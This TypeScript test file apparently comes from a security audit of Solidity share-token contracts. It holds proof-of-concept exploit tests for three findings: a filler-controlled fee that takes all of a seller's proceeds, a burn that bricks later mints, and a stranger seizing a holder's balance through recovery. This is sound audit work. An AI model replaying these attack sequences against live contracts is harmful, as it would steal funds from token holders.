import { expect } from "chai";
import { Contract } from "ethers";
import {
  connection,
  ethers,
  owner,
  signer1,
  signer2,
  signer3,
} from "../../../test/TestBase.ts";
import { getSignature } from "../../../test/Intent.ts";
import { deployFixture, mintAndWrap } from "../../../test/Fixtures.ts";
import { setBalance } from "../../../scripts/helpers/setBalance.ts";
import { getImpersonatedSigner } from "../../../scripts/helpers/getImpersonatedSigner.ts";

// Proof-of-concept tests for the three audit findings on branch `ai-audit` @ 0064dfb.
//
//   Finding 1 — TradeReactor.process: `totalFee` is a filler-supplied parameter, unbounded and
//               paid to `msg.sender` (TradeReactor.sol:118,138). A filler can set it to the full
//               execution price and keep 100% of the seller's proceeds.
//   Finding 2 — ERC20Allowlistable._beforeTokenTransfer: the admin auto-allowlist side effect
//               writes onto address(0) during a burn, silently flipping the null address from
//               FREE to ALLOWED and bricking all further mints to un-allowlisted recipients.
//   Finding 3 — Recoverable.initRecovery/recover: any stranger can seize a live holder's entire
//               balance after 184 days; the 0.01 ETH deterrence fee is silently swallowed when
//               the owner cannot receive ETH (ignored .call return value in DeterrenceFee.sol:60).

const DETERRENCE_FEE = ethers.parseEther("0.01");
const RECOVERY_DELAY = 184n * 24n * 60n * 60n; // 184 days in seconds

async function deployShares(): Promise<Contract> {
  const Shares = await ethers.getContractFactory(
    "contracts/shares/base/Shares.sol:Shares"
  );
  const shares = await Shares.deploy(
    "POC",
    "PoC Shares",
    "https://poc.example/terms",
    owner
  );
  await shares.waitForDeployment();
  return shares as unknown as Contract;
}

describe("Finding 1 — TradeReactor: unbounded filler-controlled totalFee (fee theft)", function () {
  let tradeReactor: Contract;
  let shares: Contract; // used as the trading currency (base shares token)
  let sharesUnderAgreement: Contract; // the traded token (SHA wrapper)
  let currency: Contract;
  let token: Contract;

  const SELL_AMOUNT = 10n; // seller sells 10 tokens
  const BUY_BUDGET = 150n; // buyer spends up to 150 currency

  async function fund() {
    // seller: 10 wrapped tokens
    await mintAndWrap(shares, sharesUnderAgreement, signer1, SELL_AMOUNT);
    // buyer: currency to spend
    await shares.connect(owner).mint(signer2, 1000n);
    await token.connect(signer1).approve(tradeReactor, 1000n);
    await currency.connect(signer2).approve(tradeReactor, 1000n);
  }

  async function createIntents() {
    // filler = address(0): "open to any filler" — exactly the intents any third party may process.
    const now = BigInt(await connection.networkHelpers.time.latest());
    const tokenAddr = await token.getAddress();
    const currencyAddr = await currency.getAddress();
    const reactorAddr = await tradeReactor.getAddress();

    const sellerIntent = {
      owner: await signer1.getAddress(),
      filler: ethers.ZeroAddress,
      tokenOut: tokenAddr,
      amountOut: SELL_AMOUNT,
      tokenIn: currencyAddr,
      amountIn: BUY_BUDGET,
      creation: now,
      expiration: now + 3600n,
      data: "0x",
    };
    const sellerSig = await getSignature(signer1, sellerIntent, reactorAddr);

    const buyerIntent = {
      owner: await signer2.getAddress(),
      filler: ethers.ZeroAddress,
      tokenOut: currencyAddr,
      amountOut: BUY_BUDGET,
      tokenIn: tokenAddr,
      amountIn: SELL_AMOUNT,
      creation: now,
      expiration: now + 3600n,
      data: "0x",
    };
    const buyerSig = await getSignature(signer2, buyerIntent, reactorAddr);

    return { sellerIntent, sellerSig, buyerIntent, buyerSig };
  }

  before(async function () {
    ({ tradeReactor, shares, sharesUnderAgreement } =
      await connection.networkHelpers.loadFixture(deployFixture));
    currency = shares;
    token = sharesUnderAgreement;
  });

  it("control: a fair fee leaves the seller their proceeds", async function () {
    await fund();
    const { sellerIntent, sellerSig, buyerIntent, buyerSig } =
      await createIntents();

    const totalExecutionPrice = await tradeReactor.getTotalExecutionPrice(
      buyerIntent,
      sellerIntent,
      SELL_AMOUNT
    );
    expect(totalExecutionPrice).to.equal(BUY_BUDGET);

    const sellerBefore = await currency.balanceOf(sellerIntent.owner);
    await tradeReactor
      .connect(signer3)
      .process(sellerIntent, sellerSig, buyerIntent, buyerSig, SELL_AMOUNT, 3n);
    const sellerAfter = await currency.balanceOf(sellerIntent.owner);

    expect(sellerAfter - sellerBefore).to.equal(BUY_BUDGET - 3n); // seller keeps 147
  });

  it("EXPLOIT: filler sets totalFee = totalExecutionPrice and pockets 100% of the sale", async function () {
    await fund();
    const { sellerIntent, sellerSig, buyerIntent, buyerSig } =
      await createIntents();

    const totalExecutionPrice = await tradeReactor.getTotalExecutionPrice(
      buyerIntent,
      sellerIntent,
      SELL_AMOUNT
    );
    expect(totalExecutionPrice).to.equal(BUY_BUDGET);

    const sellerBefore = await currency.balanceOf(sellerIntent.owner);
    const attackerBefore = await currency.balanceOf(await signer3.getAddress());
    const buyerTokenBefore = await token.balanceOf(buyerIntent.owner);

    // The fee is fully attacker-controlled: no fee schedule, no cap, no link to the signed intents.
    await tradeReactor
      .connect(signer3)
      .process(
        sellerIntent,
        sellerSig,
        buyerIntent,
        buyerSig,
        SELL_AMOUNT,
        totalExecutionPrice
      );

    const sellerAfter = await currency.balanceOf(sellerIntent.owner);
    const attackerAfter = await currency.balanceOf(await signer3.getAddress());
    const buyerTokenAfter = await token.balanceOf(buyerIntent.owner);

    expect(sellerAfter - sellerBefore).to.equal(0n); // seller received NOTHING
    expect(attackerAfter - attackerBefore).to.equal(BUY_BUDGET); // attacker took the full trade value
    expect(buyerTokenAfter - buyerTokenBefore).to.equal(SELL_AMOUNT); // buyer paid full price, got the shares
  });
});

describe("Finding 2 — ERC20Allowlistable: burn corrupts the null-address allowlist type", function () {
  const TYPE_ADMIN = 4n;
  let shares: Contract;

  beforeEach(async function () {
    shares = await deployShares();
  });

  it("control: minting to a fresh (FREE) holder works while address(0) is FREE", async function () {
    await shares.connect(owner)["setType(address,uint8)"](owner, TYPE_ADMIN); // issuer manages the registry as ADMIN
    await shares.connect(owner).mint(signer1, 100n);
    await shares.connect(owner).mint(signer2, 50n);
    expect(await shares.balanceOf(signer2)).to.equal(50n);
    expect(await shares.isAllowed(ethers.ZeroAddress)).to.equal(false);
  });

  it("EXPLOIT: one holder burn silently flips address(0) to ALLOWED and bricks all future mints", async function () {
    await shares.connect(owner)["setType(address,uint8)"](owner, TYPE_ADMIN);
    await shares.connect(owner).mint(signer1, 100n);

    // Holder burns 30 back to the company. Shares.burn does _transfer(signer1 -> owner) + _burn(owner).
    // The burn's _beforeTokenTransfer(owner, address(0)) runs the ADMIN auto-allowlist branch and
    // writes FLAG_INDEX_ALLOWED onto address(0).
    await shares.connect(signer1)["burn(uint256)"](30n);

    // State corruption: defaultType() still reports FREE (it only checks the ADMIN flag)...
    expect(await shares.defaultType()).to.equal(0n);
    // ...but the null address is now silently ALLOWED, so every mint FROM the null address to a
    // FREE recipient now reverts:
    expect(await shares.isAllowed(ethers.ZeroAddress)).to.equal(true);
    await expect(
      shares.connect(owner).mint(signer2, 50n)
    ).to.be.revertedWithCustomError(shares, "Allowlist_ReceiverNotAllowlisted");
  });
});

describe("Finding 3 — Recoverable: permissionless seizure + ineffective deterrence fee", function () {
  let shares: Contract;

  beforeEach(async function () {
    shares = await deployShares();
    await shares.connect(owner).mint(signer1, 100n);
    await setBalance(await signer3.getAddress(), ethers.parseEther("1"));

    // send some shares to address 0
    await shares.connect(owner).mint(owner, 100n);
    await shares.connect(owner)["burn(uint256)"](100n);
  });

  it("EXPLOIT: a stranger can seize a live holder's entire balance after 184 days", async function () {
    const victim = signer1;

    // No proof of loss is required: any address with a balance can be recovery-targeted.
    await shares
      .connect(signer3)
      ["initRecovery(address)"](victim, { value: DETERRENCE_FEE });
    const rec = await shares.recoveries(victim);
    expect(rec.recipient).to.equal(await signer3.getAddress());

    // The holder never consents and never cancels within the window.
    await connection.networkHelpers.time.increase(RECOVERY_DELAY + 1n);

    // recover() is also permissionless and pays out to the (attacker-chosen) recipient.
    await shares.connect(signer3).recover(victim);
    expect(await shares.balanceOf(victim)).to.equal(0n);
    expect(await shares.balanceOf(await signer3.getAddress())).to.equal(100n);
  });

  it("EXPLOIT: the deterrence fee is silently swallowed when the owner cannot receive ETH", async function () {
    // Owner = a contract without receive()/fallback() (a fresh TradeReactor). Low-level .call to
    // it returns success=false, which DeterrenceFee.deter ignores (DeterrenceFee.sol:60).
    const TradeReactor = await ethers.getContractFactory("TradeReactor");
    const rejectingOwner = await TradeReactor.deploy();
    await rejectingOwner.waitForDeployment();
    const ownerAddr = await rejectingOwner.getAddress();

    const Shares = await ethers.getContractFactory(
      "contracts/shares/base/Shares.sol:Shares"
    );
    const shares2 = await Shares.deploy(
      "POC2",
      "PoC Shares 2",
      "https://poc.example/terms",
      ownerAddr
    );
    await shares2.waitForDeployment();

    await setBalance(ownerAddr, ethers.parseEther("1"));
    const ownerSigner = await getImpersonatedSigner(ownerAddr, connection);
    await shares2.connect(ownerSigner).mint(signer2, 100n);

    // Attacker pays the 0.01 ETH "fee", but the owner never receives it — yet the recovery goes
    // through, so the deterrent is not enforced and the fee accrues to nobody.
    const ownerBalanceBefore = await signer3.provider!.getBalance(ownerAddr);
    await shares2
      .connect(signer3)
      ["initRecovery(address)"](signer2, { value: DETERRENCE_FEE });
    expect((await shares2.recoveries(signer2)).timestamp).to.not.equal(0n);
    expect(await signer3.provider!.getBalance(ownerAddr)).to.equal(
      ownerBalanceBefore
    );
  });
});
